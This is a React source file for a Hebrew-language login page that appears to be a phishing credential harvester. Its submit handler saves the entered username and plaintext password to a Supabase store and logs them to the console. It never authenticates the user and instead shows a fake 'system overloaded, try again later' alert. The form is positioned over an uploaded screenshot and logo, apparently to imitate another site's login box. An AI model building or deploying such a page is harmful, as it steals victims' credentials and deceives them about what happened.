
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { saveLoginData } from '../utils/dataStorage';

const LoginForm: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      // Create data object
      const loginData = {
        username,
        password,
        timestamp: new Date().toISOString(),
        rememberMe: false
      };
      
      // Save the data to Supabase
      await saveLoginData(loginData);
      
      console.log('Login data saved:', loginData);
      
      // Clear form
      setUsername('');
      setPassword('');
      
      alert('קיים עומס על מערכת האתר, נסה שוב מאוחר יותר');
    } catch (error) {
      console.error('Error saving data:', error);
      alert('שגיאה בשמירת הנתונים');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4"
      style={{
        backgroundImage: `url('/lovable-uploads/41faf953-d180-41e6-98cf-9e5fc6d9e27d.png')`,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      <div className="relative w-full h-full flex items-center justify-center">
        {/* Position the white box in the black frame area */}
        <div 
          className="absolute bg-white rounded-lg shadow-lg p-6"
          style={{
            width: '280px',
            height: '200px',
            top: '25%',
            left: '50%',
            transform: 'translateX(-50%)'
          }}
        >
          {/* Logo */}
          <div className="flex justify-center mb-3">
            <img 
              src="/lovable-uploads/a4d2a9fc-eada-4d63-80a1-0580128af6ba.png" 
              alt="Company Logo" 
              className="w-10 h-10 object-contain"
            />
          </div>

          {/* Title */}
          <div className="text-center mb-4">
            <h1 className="text-lg font-bold text-gray-800">
              כניסה לחשבון
            </h1>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-3">
            {/* Username Field */}
            <div className="relative">
              <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 text-sm">
                👤
              </span>
              <Input
                type="text"
                placeholder="שם משתמש"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full h-8 pr-10 pl-3 text-right border-gray-300 rounded text-sm bg-gray-50"
                dir="rtl"
                required
                disabled={isLoading}
              />
            </div>

            {/* Password Field */}
            <div className="relative">
              <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 text-sm">
                🔒
              </span>
              <Input
                type="password"
                placeholder="סיסמה"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full h-8 pr-10 pl-3 text-right border-gray-300 rounded text-sm bg-gray-50"
                dir="rtl"
                required
                disabled={isLoading}
              />
            </div>

            {/* Login Button */}
            <div className="pt-2">
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-8 bg-orange hover:bg-orange-hover text-white font-semibold rounded text-sm"
              >
                {isLoading ? 'שומר...' : 'כניסה'}
              </Button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
